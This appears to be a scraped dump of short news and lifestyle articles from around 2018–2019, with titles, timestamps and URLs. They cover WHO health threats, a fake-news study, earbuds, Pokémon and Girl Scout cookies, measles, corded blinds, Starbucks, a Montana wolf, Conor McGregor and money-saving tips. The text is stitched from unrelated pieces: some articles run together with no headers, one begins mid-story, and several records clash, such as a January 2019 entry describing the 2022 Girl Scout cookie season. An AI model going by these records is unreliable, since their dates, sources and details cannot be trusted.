With 40 percent of the population at risk of dengue fever, it remains one of the biggest threats to world health. The mosquito-borne disease kills up to 20 percent of people with severe forms of the disease, mainly occurring during rainy seasons in countries like India and Bangladesh.

HIV

Progress tackling HIV has been enormous, but still nearly a million people a year die of HIV and/or AIDS. With more than 37 million people living with the infection, the WHO remains committed to tackling it head-on.

One of the biggest problems in doing so is reaching groups around the world often excluded from health systems, such as ""sex workers, people in prison, men who have sex with men, or transgender people"". This year they warn that young women and girls are increasingly at risk of contracting HIV, citing that one-in-four HIV infections in sub-Saharan Africa occurs in this group, despite the fact they only make up 10 percent of the population.

Weak primary health care

Many low-middle income countries around the world do not yet have adequate primary health care (the first point of contact people have with their health system) and it's putting lives at risk. In a global conference in 2018, all countries committed to improving primary health care. The WHO will work with countries and organizations to help improve this vital first port of call.","There's A New Official Major Threat To World Health, And It's Completely Preventable",

You'll Never Guess What Group of People Shared the Most Fake
News Around the 2016 Election

",16/01/2019 9:00,https://gizmodo.com/youll-never-guess-what-group-of-people-shared-the-most-1831621718,"Old people may have the worst internet journalism literacy, according to common sense, and partially backed up by new research on the spread of so-called “fake news” immediately before and after 2016 presidential election.

A study published today in the Science Advances journal suggests that elderly Facebook users in the U. S. were far more likely to share false and misleading news stories than any other age group.

The study, conducted by researchers at New York University and Princeton University, focused on Facebook activity in the months surrounding the election. The team started by gathering a panel of 3,5000 Facebook users and non-users in spring of 2016. Right after the presidential election, researchers requested that the Facebook users in that group install an app that shared their Facebook data, including political and religious views, with researchers. Facebook approved the app to be used for research. Almost half of the participants who were Facebook users consented to sharing their profile data.

In the following months, researchers monitored the links participants posted on Facebook. They compared those links with a list of websites based on the fake news sites list that BuzzFeed assembled for its in-depth analysis on how “fake news” outperformed “real news” on Facebook prior to the election.

The study found that more than 90 percent of participants didn’t share any links from the sites included in the “fake news” list. But most people who did share articles on the “fake news” list were older than 65.

The results also show that people who identified as Republican and conservative were more likely to share false and misleading stories than Democrats and liberals (18 percent versus 3.5 percent). However—while researchers did try to remove partisan web sites from their list (like Breitbart)—many of the web sites included on the list were being used to spread pro-Trump and anti-Clinton propaganda.

Reached by Gizmodo, Facebook did not want to comment on the study itself. But a spokesperson shared information on the company’s efforts to provide context that’s intended to help users check the validity of stories in their feeds. They also shared information on research showing how Facebook’s efforts are apparently helping to address the false news problem.

Of course, a lot has happened in the online and media landscape since 2016. As the authors of the study wrote in a Washington Post op-ed about their research, “Our results focus on social media behavior from over two years ago. Online, that’s virtually an eternity.”



In the Washington Post article, they also acknowledge they “don’t know whether ‘being old’ is associated with sharing more fake news, or if it’s being in the generation born before 1950"" and they can’t say “whether people raised in the modern digital environment—digital natives—will share more fake news as they age.”

Hopefully, research like this will help social networks figure out where to focus their efforts in the ongoing and potentially futile war on bullshit.

We compared Apple's $159 AirPods to Xiaomi's $30 AirDots and
the winner was clear

",15/01/2019 20:34,https://www.businessinsider.com/apple-airpods-review-vs-xiaomi-airdots-2019-1,"Apple AirPods have a low-price competitor: Xiaomi came out with $30 knockoffs called AirDots that are currently only available in China.

We tried the AirDots to see how they compared against Apple's $159 AirPods.

Watch the video above to find out if AirPods are worth the cost or if AirDots provide the same quality wireless headphones for a fraction of the price.

These are AirPods, Apple's $159 wireless headphones and these are AirDots, Xiaomi's $30 wireless headphones.

Xiaomi has long been referred to as the Apple of China. So we wanted to know, how do the headphones compare? Are AirPods worth the cost? Or can AirDots provide the same quality for one-fifth the price?

Let's start with looks. AirPods weigh approximately 46 grams or 1.6 ounces (4 grams per each AirPod and 38 grams for the case). And the AirDots weigh approximately 39 grams or 1.4 ounces (4.2 grams per each AirDot and 30.6 grams for the case). Both come in a container about the size of a pack of floss .

As for design, AirPods basically look like your normal Apple EarPods without the wire. They're long, sleek, and are generally molded to the shape of an ear. The AirDots look more like hearing aids. They're in-ear headphones that have an oval shape exterior which makes the earbuds bulky and a little bit heavy despite being a fraction of the weight of the AirPods.

Both the AirPods and the AirDots will automatically connect to your Bluetooth device when you put them in your ear. The AirPods do connect a little faster to your iPhone because it's an Apple product, but the AirDots still connect pretty quickly. Bluetooth, in general, is still an issue. I've had my AirPods glitch on me one or two times before. The sound would go in and out and there was one instance where only one of my AirDots was connected.

The AirPods are pretty comfortable and require very little effort to place in your ear. AirDots, on the other hand, require a bit more effort to stick them in your ear. Since they're in-ear headphones, the silicone rubber earbuds can be uncomfortable to wear. You might feel like your ears are clogged, as if you're in an airplane or underwater and they might take some time to fit and adjust in your ears. However, once they are in there, they rarely fall out no matter how hard you shake your head.

Moving on to the most important part, the sound quality. AirPods don't have a noise-canceling feature but music still sounds crisp and there's a decent bass. AirDots have a really good noise-canceling feature, a powerful bass, and clear sound. Unlike the headphones that sit in the outer ear, these earbuds extend into your ear canal, blocking out most sound from your surroundings. While this can provide you with some high-quality music, it might not be good if you like hearing everything around you. I wore them while walking down the busy streets of New York City and I couldn't hear any honking cars or the loud crowd.

You can also make phone calls on both devices. AirPods filter out the background noise pretty well and are able to emphasize the person's voice, but AirDots have limitations. You can hear a lot of background noise, like ruffling sounds from your clothes and your footsteps, which is distracting when you have to take a call on the go. If you use earbuds a lot for phone calls, you might wanna stay away from AirDots, despite them being good at blocking background noise while listening to music.

To end a phone call, you have to double tap your AirPods. For AirDots, you can single tap. You can also single tap either side of your AirDots to play a song, pause a song, or double tap to open voice assistant. While single tapping sounds like a more simple gesture it can actually be an issue. You could be adjusting your AirDots in your ear but it would register it as a tapping motion on the headphones. AirPods, on the other hand, offer a double tap feature that you can customize for each bud. You can set one AirPod to play the next or the previous track and the other pair to pause a song, open Siri, or turn the feature off completely. Taking one AirPod out of your ear also stops the music from playing.

These headphones also offer similar ranges. Apple claims the AirPods have a range of about 12 meters or 40 feet while Xiaomi says the AirDots can reach about 10 meters or 32 feet.

As for battery life, AirPods can last up to 5 hours of constant listening while AirDots can last up to 4 hours. Both devices come with a case that charges them. However, the AirPods will show you the battery percentage for both the case and the headphone on your phone while the AirDots will only show you the battery icon on your connected mobile device. There are lights on both headphones that indicate when they're charging. The AirPods use the same lightning cable as your iPhone so you don't have to worry about carrying another cable to charge them, whereas the AirDots use a micro USB cable.

Overall, for $30, I say the AirDots are a great deal. They're a solid set of wireless headphones that have most of the features of the AirPods at a fraction of the price. But if you don't mind the high price tag, want the customization of AirPods, and are already in Apple's ecosystem, the AirPods may be the way to go.",We compared Apple's $159 AirPods to Xiaomi's $30 AirDots and the winner was clear,

Pokémon Sugar Cookie Dough Just Hit Shelves — Here's Where To

Find It
",3/01/2019 8:09,https://www.bustle.com/p/pokemon-sugar-cookie-dough-from-pillsbury-just-hit-shelves-heres-where-to-find-it-15578531,"Since the late 2010s have essentially just become the '90s all over again, it's only fitting that the Pokémonaissance that started with ""Pokémon Go"" in 2016 has only grown stronger since. While we still have plenty to occupy us Pokémon-wise with the app still in full swing (looking at you, family members still on it) and the new games on Nintendo Switch, the latest Pokémon trend is a little more hands-on and a LOT more delicious: Pillsbury has Pokemon sugar cookie dough that comes in little shapes inspired by the iconic card game/television series/pseudo-religion you followed in the '90s. Now you can make your whole kitchen smell like that time your elementary school teachers banned you from trading cards during recess all over again!

The cookies were spotted in the refrigerated section of Walmart by Instagram account @snackspy. Per the image, the cookies come pre-cut in packages of 24, with half of them in the shape of Pokéballs and the other half with an outline of your favorite sassy electric mouse. It's worth noting that they don't appear to have hit Walmart's website yet, and that availability may be a little limited as of right now — as dorky as it is to admit, I went looking for these at my local Walmart and they weren't on shelves yet — but hopefully, considering the demand for all things Pokémon, these cookies will see a wider rollout soon. I mean, just look at them. What self-respecting '90s kid wouldn't want it in their lives?

These cookies are far from the only thing that Pokemon lovers have to look forward to in 2019. Those of us keeping up with our favorite fictional creatures are well-aware that another Pokémon movie is on the way. Remember in 2017, when everyone flipped their lids because Pikachu spoke human words to Ash at the end of Pokémon: I Choose You!? Turns out we as a society are leaning right into that weirdness, if the upcoming trailer for Detective Pikachu, slated for a May 2019 release, is any indication. Ryan Reynolds plays the lead as one gloriously sarcastic Pikachu, who speaks more English in the trailer than I possibly do in an entire day (though, to be fair, he is technically speaking in Pokémon; only one human seems to be able to understand him).

All this is to say, if you are unnerved by the idea of a talking Pikachu and unsure with how you're going to cope with it psychologically come 2019, it looks like you'll be able to take the edge off with these new cookies from Pillsbury. Pop them in the oven, bake, and forget. And if that doesn't work, well — you can always see if that ""Pokémon Go"" dating app is still functioning. If you're going to be scarred for life by Ryan Reynolds playing a foot-tall mouse, you might as well do it with a buddy.

In the meantime, if you're looking for these cookies, keep an eye out at your local Walmart — even if you don't spot them, there's plenty of Pokémon stuff there for you to blow all your Pokémon Dollars on in the Year Of Our CGI Pikachu 2019.",Pokemon Sugar Cookie Dough From Pillsbury Just Hit Shelves — Here's Where To Find It,

Girl Scout Cookie Season Officially Starts Today—
and There's a Brand New Cookie Joining the Lineup
",2/01/2019 20:57,https://www.yahoo.com/lifestyle/introducing-newest-brownie-inspired-girl-161500977.html,"Sorry Samoas, Thin Mints and Tagalongs—there’s a new cookie in town and we can’t wait to get our hands on it. With the start of 2022’s cookie season, The Girl Scouts just launched their newest addition to the cookie fam, Adventurefuls.

Per a press release, the new biscuit is described as an “indulgent brownie-inspired cookie with caramel-flavored crème and a hint of sea salt.” The dessert is topped with extra chocolate drizzle for good measure. Frankly, we’re surprised the organization didn’t come up with a brownie-like flavor sooner, considering an entire rank of young scouts in the organization are known as “Brownies.” Nevertheless, we got a sneak peek of the new treat, and it’s just as delicious as it sounds. The texture of the cookie is crisp and light, while the decadent caramel crème offers smooth, sweet-and-salty contrast.

The unique name is tied to the organization’s overall mission. “Adventurefuls take cookie lovers on a delicious taste adventure, just like Girl Scouts take on their own amazing adventures all year long,” part of the release reads.

The new flavor is the first to launch since the company introduced the Toast-Yay!, a French toast-flavored cookie shaped like a miniature piece of bread, at the start of 2021. The newest addition joins the yummy lineup of cookies including Thin Mints, Tagalongs, Samoas, Do-si-dos, Trefoils, Lemon-Ups and Toffee-tastics.

There are a few routes you can take to order your faves. If you know a Girl Scout, reach out to her to find out how she’s selling her spoils this year. If you don’t know one, visit the Girl Scout cookie website or use the official Girl Scout Cookie Finder app to spot a cookie booth near you (if there are any in your area). Starting February 18, you can simply enter your zip code into the online Cookie Finder to buy from a local troop or donate them to first responders and local causes.

Even cooler, you’ll also be able to snag sweets via DoorDash this year. Download the app and search ""Girl Scouts"" to see if on-demand delivery is available yet in your area.

Iceland Has Basically Eliminated Down's Syndrome, But Not In The
Way You Think

",31/12/2018 21:33,https://didyouknowfacts.com/iceland-eliminated-downs-syndrome-complicated/,"If you’ve ever been pregnant, then you’ve probably had the discussion with your partner (or other trusted confidantes) on whether to have the optional testing that reveals potential birth defects around the midway point. It’s offered (but not required) in the United States, and one of the most common defects discovered is a likelihood of Down’s Syndrome.

In the U.S., around 67% of women who receive a positive diagnosis for their child choose to terminate their pregnancy. In Iceland, that number is nearly 100%, a fact that has resulted in the defect being all but eradicated in the island nation. They only see about 2 cases per year.

Despite claims that the abortions are forced by the Icelandic government, the truth is that the women receive neutral counseling and make their own decisions. That said, there are those who believe strongly that, despite the often poor prognosis and the lifelong financial cost and emotional toll of taking care of a child with Down’s, the lives of those with Down’s should be valued by society.

As with all debate surrounding the ideas of eugenics, genetic choices, and abortion, there are strong opinions on both sides of the issue. For now, women in both Iceland and the United States appear to be able to make the decision that’s best for them and their families.

Which is maybe the best place to start.

Do Partridges Really Live in Pear Trees?

",25/12/2018 10:28,https://www.nationalgeographic.com/animals/article/animals-birds-holiday-culture-christmas,"The lucky recipient in the classic Christmas carol ""The Twelve Days of Christmas"" got 23 birds over the course of the holiday season.

Hopefully they didn’t live in a studio apartment.

In the yuletide spirit, we’re taking a closer look at the birds immortalized in the English folk song, first published around 1780.

Seven Swans A-Swimming

There are eight species of swans worldwide, and the most common species in England is the mute swan. The classy birds, inspirations for European fariytales, are popular exports and are often seen a-swimming in park lakes in North America.

Generally “swans mate for life,"" and couples have an endearing ""habit of swimming side-by-side,"" says J.V. Remsen, curator of birds at the Louisiana State University Museum of Natural Science. (Watch a mute swan ""windsurf"" across a lake.)

Six Geese A-Laying

It's unknown which geese the song refers to, although several species live in England, including pink-footed geese, barnacle geese, and Canada geese, a non-native species introduced from the U.S.

Geese eggs can provide quite a feast—the eggs of a wild Canada goose, for example, are more than three inches long, while a regular chicken egg is a little over two inches. Domestically a jumbo chicken egg weighs in at 2.5 ounces, while the egg of a Embden goose, a popular domestic breed, is nearly 6 ounces.

Noisy by nature, and with amazing eyesight and hearing, domestic geese have been trained to guard police stations in China. (Related: ""Honk if You Think Geese Are Good Guard Dogs."")

Four Colly Birds

Though most of us sing “four calling birds,” the correct word is actually ""colly,"" according to a 2016 blog post by the Library of Congress.

The word colly is an Old English adjective used to describe something black, like coal. So colly birds likely refer to blackbirds, according to the library. Twenty more and you’ve got a pie.

There is, however, a caveat for those of us in North America, Donald Kroodsma, retired ornithologist at the University of Massachusetts, Amherst, says via email.

""The blackbird of English literature is a close relative of our robin,” which are both part of the thrush family, Kroodsma says, whereas North American blackbirds are part of the icterid family.

And if you prefer calling birds, we asked Kroodsma, author of Listening to a Continent Sing: Birdsong By Bicycle From the Atlantic to the Pacific to choose a favorite.

“What's sweeter than a cardinal song?” he says.

Three French Hens

Most of the birds mentioned in the song are wild species, except for the French hen, ""which is probably a breed of chicken and hence not wild,” says Kathi Borgmann, an ornithologist at the Cornell Lab of Ornithology.

The song may refer to the Favorelles chicken, a breed named for the region in France from which they originated in the late 1800s. These large, colorful birds have feathery ear muffs and beards—even the females have beards.

Must be hipster chicks.

Two Turtle Doves

The European turtle dove, a beautiful bird with pink and chestnut colors, is in no way related to turtles, quips Remsen.

Their scientific name is Streptopelia turtur—the latter of which means ""turtle"" in Latin. “So this is truly a curious situation.”

Hear a European Turtle Dove's Call Audio Timeline Slider: Use the left or right arrow keys to decrease or increase the slider value.

Some people believe their reptilian name comes from their call, which makes a ""turr, turr"" sound.

A Partridge in a Pear Tree

Possibly the most famous avian in the Christmas diddy is the partridge.

To most, a partridge probably brings to mind something like the plump little chukar, a partridge native to Eurasia and introduced to North America as a game bird.

There are 92 known species of partridges, which are relatives of quail and live in grasslands the world over.

Sadly, though, the birds are ground nesters, and not ""likely to roost in pear trees,"" says Michael Ward, avian ecologist at the University of Illinois. (See the world's most unusual Christmas trees.)

Montana Fish, Wildlife and Parks (FWP) revealed the identity of the mysterious wolf-like creature that was shot dead in the state last month. Officials confirmed in a news release Monday that DNA results proved the animal was a gray wolf.

“The lab compared the animal’s DNA with thousands of other DNA samples from wolves, coyotes and dogs. The conclusion was clear – this animal is a gray wolf from the northern Rocky Mountains,"" the statement read.

Montana FWP officials initially weren’t certain what the creature was when a rancher fatally shot it on his property.

The wildlife agency spoke about the beast, which it said had ""captured the curiosity of the nation.""

""Confusion about the animal might be due to the condition of the animal and the photos, which seemed to show short legs and big ears,"" the agency explained Monday.

Officials said an inspection of the animal at its laboratory “revealed a relatively normal looking, dark brown wolf.”

Adding, the wolf weighed 84.5 pounds and was around 2 to 3 years old.

“The wolf was a non-lactating female, which means she didn’t have a litter of pups,” they explained, noting that “any unique physical features she has might also appear in her siblings or parents and may continue to be passed along by others in her family.”

U.S. Fish and Wildlife Service geneticist Mary Curtis said it’s not unusual for there to be physical variations of animals within a species.

According to undisputed champion Katie Taylor, Conor McGregor does not get much praise from his home of Ireland.

Speaking on The MMA Hour with Ariel Helwani, Taylor discussed the career of McGregor and what he has done for the sport of MMA and Ireland in general. McGregor has helped open the door for other international fighters. Taylor, however, believes that McGregor does not get as much acclaim in Ireland compared to anywhere else. She has compared to him one of the most legendary and influential boxers of all time.

“He’s always been a fantastic support to me, but I think he’s just someone who’s actually transcended the sport,” Taylor stated, via MMA Fighting. “He’s like, for me, the Muhammad Ali of the UFC. He’s just a fantastic athlete. A great businessman as well. But what he’s done in the sport and the UFC has been absolutely incredible, and I don’t think he’s celebrated as much as he should be here in Ireland. I think he is an absolute global superstar and just a phenomenal athlete, and he’s always been a complete gentleman towards me.”

Taylor, a 2012 Olympic gold medalist, made her professional debut in 2016. In her seventh fight, she won the WBA Lightweight Title and has continued to collect gold since. She is the current undisputed lightweight champion and has defended a version of the gold she wears twelve times. Taylor is scheduled to face seven-division champion Amanda Serrano sometime in 2022.

Both fighters trained at Crumlin Boxing Club, and McGregor has been a big supporter of Taylor throughout her career. Taylor’s praise of McGregor’s career results from the success he has had over the years.

Huge congrats Katie Taylor!!! Put that one to bed for sure, no questions! Top drawer stuff as always from Ireland’s greatest! @KatieTaylor ❤️ 🇮🇪 — Conor McGregor (@TheNotoriousMMA) August 22, 2020

McGregor made his professional MMA debut in 2008. A Cage Warriors Lightweight and Featherweight Champion, McGregor joined the UFC in 2013. He became a hot commodity around 2015, winning the UFC Featherweight Title against Jose Aldo in thirteen seconds at UFC 194. His legend grew after two fights with Nate Diaz and things really blew up when he beat Eddie Alvarez at UFC 205 in 2016 for the UFC Lightweight Title. Back then, Irish fans passionately invaded UFC events.

McGregor fought Floyd Mayweather in a boxing bout in 2017, and everything has changed for him since then. He owns a whiskey business and has made a lot of money outside of fighting. Since returning to MMA action in 2018, McGregor is 1-3 in his last four fights. McGregor has lost two in a row to Dustin Poirier, with the last fight at UFC 264 in January where he broke his tibia.

Outside of the octagon, however, has been messy for McGregor. A a UFC 223 media day in Brooklyn in 2018, McGregor invaded the Barclays Center and tried to pick a fight with Khabib Nurmagomedov. He threw a dolly at a bus full of fighters, breaking glass everywhere. He has also had several sexual assault allegations thrown his way (not guilty of any action as of this moment), destroyed a fan's phone in Miami, and famously punched an elderly man in Dublin for turning down a drink at a pub. Recently, he got into an altercation with Machine Gun Kelly and was accused of punching DJ Francesco Facchinetti.

Taylor, however, is looking at his accomplishments within the sport, while understanding how controversial he is outside of it, and what those accomplishments mean to her.

“I just think he’s had a few controversial moments outside of the cage as well that people obviously didn’t appreciate,” Taylor went on to say. “But I’m looking at him as just a phenomenal athlete, and someone who I generally think has transcended the sport, someone who’s become bigger than the sport. Nearly every time he does fight, it’s an absolute huge event. He still gets the highest number of pay-per-view figures and he’s still the highest-paid athlete in the UFC.”

McGregor is expected to return to action sometime in early 2022. It is unknown who he would face in the octagon when he comes back.",'Muhammad Ali of the UFC': Katie Taylor says Conor McGregor is underappreciated in Ireland,

Show Caption Hide Caption New safety ban limits corded blinds to prevent child strangulation Studies show corded blinds pose a serious threat to the safety of children. Now, manufacturers will have new safety standards to follow that will shorten or remove cords from blinds altogether. USA TODAY

A new safety standard will take effect Saturday limiting the manufacturing of corded blinds in response to fears they could injure or kill children by strangulation.

Starting Dec. 15, most products used to cover windows must either be cordless or have short, inaccessible cords.

Details of the ban in corded blinds were revealed in January by the Window Covering Manufacturers Association.

""The new safety standard is a direct result of ongoing industry innovation, technological advances and new product development,"" Ralph Vasami, executive director of the WCMA, said in a statement in January.

The standard will affect more than 80 percent of all window covering products sold in the U.S. and Canada.

According to the Consumer Product Safety Commission, there have been 50 fatalities reported between 2012 and 2017 linked to window cord strangulation among infants and young children.

A study published last year in the journal Pediatrics found between 1990 and 2015, about 17,000 children under 6 years old – about two kids a day – went to the emergency room for injuries related to corded blinds.

""A curious child can quickly get entangled in a window blind cord,"" Gary Smith, senior author of the study and director of the Center for Injury Research and Policy at Nationwide Children’s Hospital, said in a statement. ""This can lead to strangulation within minutes, and the parent may not hear a thing because the child often can’t make a sound while this is happening.""

In 2015, the WCMA created a ""Best for Kids"" program to help consumers identify window blinds that were safe in households with kids.

CPSC advises consumers to replace any corded blinds with cordless ones. For households with corded blinds, the CPSC suggests the following tips:

Move any furniture away from windows or cords to make them tougher to reach.

Keep tasseled pull cords as short as possible.

Remove dangling cords, and keep any others out of reach.

Double check cord stops are properly installed to limit their movement.

Keep continuous-loop cords on draperies and vertical blinds anchored to a floor or wall.

Why Starbucks Baristas Get Your Name Wrong All the Time
WHY?!
",13/12/2018 19:05,https://www.thrillist.com/drink/nation/starbucks-cups-barista-wrong-misspelled-names,"Yang is not alone however: Even popular sports personalities with half a million Twitter followers face the same issue at the coffee chain.

“Even when baristas get the spelling [of my name] right, no one can pronounce it correctly, or refuse to yell it out loud. Most of them read it however they like, and I always miss my order. It's frustrating."" So Yang now gives her name as Superstar, which she says usually gives people a good laugh, and she never misses an order in the process.

That's why many people not named Dave or Jen avoid potential awkwardness by giving baristas a fake name that's super-easy for anyone to spell and say. ""My name is Kun. Just like fun with a ‘K,’” said Kun Yang, a New York City resident. ""That's how my friends introduce me. I use a fake name because I have a name that unfortunately sounds very much like the 'C' word.”

For anyone with an uncommon name, ordering Starbucks coffee can feel a little like the first day of school. They're waiting and hoping the barista doesn't embarrass them by saying their name wrong when they call it out. It can also lead to total confusion when drinks are called out for a person that doesn’t actually exist.

Aside from its strange cup size names and seemingly endless menu of frozen drinks, Starbucks is probably best known for its inability to get its customers’ names right . The chain is so notorious for it that it has become the basis of a number of comedy sketches theorizing that they do it on purpose .

So the real question is, do baristas do this on purpose? Is the chain just playing one long and large prank on coffee drinkers everywhere? Not exactly.

""We have never asked or directed any of our partners to misspell names of our customers for any reason,” a Starbucks spokesperson said. ""Writing names on cups is a fun tradition born out of the relationship and interaction between our employees and customers. Our [baristas] aim to do their best when it comes to spelling the names of our customers, though at times it can be tricky.""

Baristas are also not required to ask for the spelling of your name, which is why it can go so haywire when you order. ""There's no real corporate policy other than that we ask for your name,"" said Tim*, a barista at a Starbucks in Nashville revealed [Editor's Note: The names of the baristas have been changed]. ""We're not required to ask for a spelling. We often do, but it's hit or miss depending on the person working at the time.""

But the main reason baristas get your name is wrong is that they are just insanely busy most of the time. ""When I have 40 people in line, if I took the time to ask every single person on line how to spell their name, it's going to get even longer,"" Lisa*, barista in Dallas noted. So they resort to guessing.

""We're going to get complaints from customers that we're taking too long. It's a matter of expediency,” Lisa said. ""It's often a time thing,"" Tim added. ""Especially in the morning when we've got a line out the door.""

So it's up to you -- do you want your coffee in a minute or two, or do you want your name spelled correctly?

There is one way Starbucks customers can avoid name butchery on their coffee orders. It’s as simple as downloading the Starbucks app. Once you put in your credit card info, you can order a drink and have it appear on the counter of the store closest to you, a place which will inevitably five minutes from anywhere in America. By the time you arrive, it'll be sitting on the counter with your name printed on the sticker exactly as you want it to be spelled because it pulls your name from the app, you dig?

So, for once, Katerina, you can be yourself, and not “Bob.”

Measles Are Coming Back Around The World, And The Reasons
Should Make Us Ashamed

",9/12/2018 15:46,https://www.sciencealert.com/measles-is-making-a-comeback-around-the-world-as-vaccination-rates-languish,"The world has not done enough to improve vaccination coverage, and now, measles is experiencing a resurgence in nearly every corner of the globe.

Last year, the number of reported measles cases spiked by more than 30 percent worldwide, according to a new report from the World Health Organization (WHO) and the US Centers for Disease Control and Prevention (CDC).

Experts have been warning for years that something like this could happen. Because even though measles is easily preventable through two doses of a vaccine, we need about 95 percent coverage to stop outbreaks from happening.

Today, that goal is still a ways off. For nearly a decade, we have failed to get vaccination coverage past the 85 percent mark. And after years of languishing, the gaps in vaccination are finally taking their toll.

In 2017, the new report found five out of all six WHO regions in the world experienced an upsurge in measles outbreaks, and that was especially true in the Americas, Europe and the Eastern Mediterranean. Only in the Western Pacific did the number of measles cases fall.

""Without urgent efforts to increase vaccination coverage and identify populations with unacceptable levels of under- , or un-immunised children, we risk losing decades of progress in protecting children and communities against this devastating, but entirely preventable disease,"" warns Soumya Swaminathan, Deputy Director General for Programmes at WHO.

To really understand what that means for the world, we only have to look back a few generations.

Before 1963, when there was no measles vaccine, the world experienced a major measles outbreak every few years, causing 2.6 million deaths annually.

Five decades later, the world is closer than ever to eliminating this highly contagious and potentially deadly disease. In fact, countries like the US, the UK, Australia, New Zealand and Japan have already done so, and many more nations are on the brink of doing the same.

The impact of such measures has been extraordinary. Since the turn of the century, the measles vaccine has saved over 21 million lives, decreasing the global death toll by 80 percent in just 17 years.

But after years of progress, things have begun to take a turn for the worst, thanks in large part to a lack of funding and a rise in misinformation.

""The resurgence of measles is of serious concern, with extended outbreaks occurring across regions, and particularly in countries that had achieved, or were close to achieving measles elimination,"" said Swaminathan.

Watching measles make a global comeback is kind of like watching a character in a horror film make dumb decisions in slow motion. As a global community, we have a safe and effective way to eliminate measles at our fingertips and yet we keep failing to use the weapon at hand.

Instead, we are running up the goddamn stairs once again.

In 2017, the report found that 20.8 million infants worldwide failed to receive the first measles vaccine.

""The increase in measles cases is deeply concerning, but not surprising,"" says Seth Berkley, CEO of Gavi, the Vaccine Alliance.

Not surprising, because most public health experts have seen this coming for years. Organisations like WHO and its partners in the Measles & Rubella Initiative have warned before that if vaccination rates aren't strengthened, this preventable-disease could rebound.

But with measles posing much less of a threat today, many nations have become careless in their attempts to ensure its elimination. In addition, false rumours, misconceptions and myths about the vaccine have only served to fuel recent outbreaks.

In Europe, where misinformation about the measles vaccine is particularly evident, vaccination coverage in some areas is less than 70 percent.

""Complacency about the disease and the spread of falsehoods about the vaccine in Europe, a collapsing health system in Venezuela and pockets of fragility and low immunisation coverage in Africa are combining to bring about a global resurgence of measles after years of progress,"" explains Berkley.

The authors of the report are calling for urgent action. They say we need sustained investment so that routine vaccination services can be strengthened, especially among the poorest and most marginalised communities.

At the same time, they argue we also need to ensure public support for immunisations, combatting misinformation and hesitancy around vaccines as much and as soon as possible.

""Existing strategies need to change: more effort needs to go into increasing routine immunisation coverage and strengthening health systems,"" argues Berkley.

""Otherwise we will continue chasing one outbreak after another.""

For Americans looking for a better life, this state is their No. 1 choice

The Sunshine State ranked as the No. 1 destination among homebuyers who were looking to move across state lines, according a new analysis from LendingTree. All told, 12.4% of all mortgage requests made by out-of-state movers were for homes in Florida.

When the data was adjusted by each state’s population however, South Carolina ranked as the top destination, just ahead of Florida. There were 52% more mortgage loan requests from movers to the Palmetto State than would be expected based on its population.

Other states that saw the greatest influx of residents, not adjusting for state’s population, include Texas, California, Washington, Arizona, Massachusetts and North Carolina. To produce its findings, the researchers reviewed more than 2 million new purchase mortgage-loan requests for primary residences across all 50 states in 2018.

Don’t miss:Why 2019 won’t lead to a home buyer’s market

Most Americans opt to move to a neighboring state when they decide to move across state lines. In only 20 states was the top destination not a bordering state — and for 13 of those states, Florida was the most popular location among out-of-state movers.

Texas had the smallest percentage of residents who wanted to move to another state, at just 6.6%, followed by Michigan (8.6%) and Florida (8.9%). One reason why the Lone Star State might keep its residents happier than their peers who live elsewhere could be the growing job markets in cities like Houston, Dallas and Austin.

California has seen a mass exodus of residents in recent years, according to Trulia, many of whom were searching (potentially in vain) for more affordable housing. Despite that, the Golden State doesn’t have the largest share of out-of-state movers.

That honor instead goes to Alaska, where nearly one in four people buying a new home were looking to move to another state. Other states with a large share of out-of-state movers include Hawaii, North Dakota, New York and Rhode Island.","For Americans looking for a better life, this state is their No. 1 choice",

top 5 money-saving tips

It was enough money that, when the time came, I could hand over the piggy bank as a down payment on my first apartment. I was able to save so much while making so little because I did my best to minimize bad choices, like trying to keep up with the New York Joneses, and maximize good fortune, like an inheritance from my grandmother. Both mattered a great deal. So did seemingly incidental things, like settling down with someone thrifty. Here are the five most important savings tips I learned in those eight years. If you're going to partner up, do it wisely ﻿Love advice seems like a strange start to a story about saving, I know. And yet, nothing will deplete you faster, emotionally and materially, than getting stuck with the wrong person, or dating when you actually want to be single. Besides, love and money are usually entangled from the start, one way or another. Ben, who I met in college, was a big-hearted, thoughtful guy who was right for me, and I sensed from the start that part of what made us compatible was that we both prioritized the same things, like security. That meant we didn't take impulsive trips to Vegas, or even to Florida; we kept impulse buys of all sorts to a minimum. He didn't ask for expensive gifts from me, and I never expected jewelry or flowers. We found affordable ways to say ""I love you."" He once found me a perfect book of poetry at The Strand that probably cost $5 but meant more than 15 bouquets.

Try not to kiss frogs. Kissing frogs is expensive.

Once we moved to New York, we split a bedroom in someone else's apartment, cooked in bulk, and shopped at food coops, secondhand stores and other places we knew we could get good deals. Sometimes we took frugality too far: My mom was grossed out by our dresser, which had been abandoned in a field off the New Jersey Turnpike, and flat-out repulsed by the broken futon we slept on as a bed, which we had found on Second Avenue. But for the most part, we managed to keep things simple without feeling deprived (and, thank God, without getting bedbugs). We took romantic walks together and treated ourselves to at least one dinner out a week. On special occasions, we threw caution to the wind and got tickets to Broadway shows like ""Avenue Q"" or reservations at bucket-list restaurants like Babbo. Surround yourself with like-minded people The fact that Ben had little interest in clubbing or brunches meant I was able to save, even when I worked a series of frustrating entry-level jobs that paid me under $30,000 a year. But the fact that my friends felt the same way helped too. We didn't shop for fun; instead, we hung out at each other's apartments, in parks, in free museums, in art galleries and at coffee shops. We played board games and watched DVDs.

Fancy fun at home

We skipped the traditional Manhattan nightlife stuff — fancy cocktails and overpriced beer, as well as the associated late-night splurges on diner food and taxis — in favor of cheap evening events like readings, improv shows and The Moth story slams. Often, we could call it a night having spent under 10 bucks each. I still felt like I was experiencing New York City and having a social life, but I wasn't going broke. Put your money to work I opened a savings account immediately upon starting my first job out of college and, though I changed positions several times in those first few years and never earned much, my mentality stayed the same: Money was mainly for future use, not present pleasure. Once I had enough for about six months of living expenses, I opened up a high-yield online savings account that gave me four percent interest and started moving reserves over there. And once that amount had grown substantially, I took a good chunk and moved it into a high-yield, multi-year CD.

Locking my money away, even though it meant I'd get it back and then some in the long run, made me nervous: What if I needed funds and couldn't get them? What if I had an emergency that exceeded the capabilities of my six-month cushion? I decided to risk it. I was lucky: Even when I did get unexpected doctor bills, and when I was let go and had to live off of $400 a week in unemployment checks, my six-month fund supported me, just as it was designed to do. And, as the CDs matured, I rolled principal and profits into more CDs. Though I didn't know it, I was doing a kind of CD laddering, and it worked. Avoid lifestyle inflation

